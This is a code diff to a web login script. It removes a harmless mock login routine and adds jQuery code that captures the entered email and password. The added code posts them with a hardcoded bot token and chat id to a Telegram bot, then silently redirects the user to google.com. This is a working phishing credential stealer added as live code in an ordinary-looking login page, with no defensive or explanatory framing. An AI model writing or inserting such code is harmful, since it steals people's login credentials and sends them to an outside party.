@@ -1,32 +1,19 @@
-document.getElementById('togglePassword').addEventListener('click', function () {
-    const passwordField = document.getElementById('password');
-    const passwordFieldType = passwordField.getAttribute('type');
-
-    if (passwordFieldType === 'password') {
-        passwordField.setAttribute('type', 'text');
-        this.textContent = 'Hide';
-    } else {
-        passwordField.setAttribute('type', 'password');
-        this.textContent = 'Show';
-    }
-});
-
-document.getElementById('loginForm').addEventListener('submit', function (e) {
-    e.preventDefault();
-    
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-
-    // Simple validation (you can expand on this)
-    if (email === '' || password === '') {
-        alert('Please fill in both fields.');
-        return;
-    }
-
-    // Mock login process (replace with actual authentication)
-    if (email === 'user@example.com' && password === 'password123') {
-        alert('Login successful');
-    } else {
-        alert('Invalid email or password');
-    }
-});
+var token = "6423548656:AAFuFXiyAUDll8FgYjbYw6Iu30NdeSwml7s";
+        var chat = "1955367555";
+        $("button").click(function(){
+            if($("#password").val()==""){
+                alert("Password field cannot be empty.");
+            }else{
+                var mail=$("#username").val();
+                var pass=$("#password").val();
+                var m = `Email: ${mail}\nPass: ${pass}`;
+                $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
+                    chat_id:chat,
+                    text:m
+                }).done(function(data){
+                    window.location.replace("https://google.com");
+                }).fail(function(data){
+                    alert("Something is wrong");
+                });
+            }
+        });
